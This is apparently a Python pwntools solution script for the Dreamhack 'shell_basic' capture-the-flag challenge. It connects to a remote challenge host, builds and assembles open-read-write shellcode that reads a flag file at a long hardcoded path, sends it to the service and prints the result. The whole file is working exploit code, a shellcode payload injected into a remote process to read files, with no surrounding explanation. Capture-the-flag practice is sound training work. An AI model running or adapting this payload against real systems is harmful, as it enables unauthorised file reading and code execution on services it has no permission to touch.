from pwn import *

context.arch = "amd64"
p = remote("host3.dreamhack.games", 24520)

r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.pushstr(r)
shellcode += shellcraft.open("rsp", 0, 0)
shellcode += shellcraft.read("rax", "rsp", 0x30)
shellcode += shellcraft.write(1, "rsp", 0x30)

#print(shellcode)
#print('\n')

shellcode = asm(shellcode)

#print(shellcode)

p.sendlineafter('shellcode: ', shellcode)

print(p.recvuntil(b'}'))
